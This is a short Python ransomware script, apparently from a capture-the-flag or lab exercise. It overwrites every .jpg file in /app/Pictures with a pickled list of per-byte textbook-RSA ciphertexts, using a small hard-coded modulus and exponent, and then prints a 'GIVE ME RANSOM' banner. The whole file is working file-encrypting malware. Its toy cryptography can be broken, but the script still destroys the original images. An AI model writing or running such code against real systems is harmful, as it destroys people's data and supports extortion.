#!/usr/bin/env python3

import os
import pickle
n = int(22291846172619859445381409012451)
e = int(65535)

directory = "/app/Pictures"

for filename in os.listdir(directory):
    if filename.endswith(".jpg"):
        filepath = os.path.join(directory, filename)
        plain_bytes = b''
        with open(filepath, 'rb') as f:
            plain_bytes = f.read()
        cipher_int = [pow(i, e, n) for i in plain_bytes]
        with open(filepath, 'wb') as f:
            pickle.dump(cipher_int, f)
ransom_msg = "///////////////////////////////////////////////////////\n" + "////////////////---------ERROR---------////////////////\n" 
ransom_msg += "//////////////---GIVE ME RANSOM HA HA HA---////////////\n" + "///////////////////////////////////////////////////////\n" 
print(ransom_msg)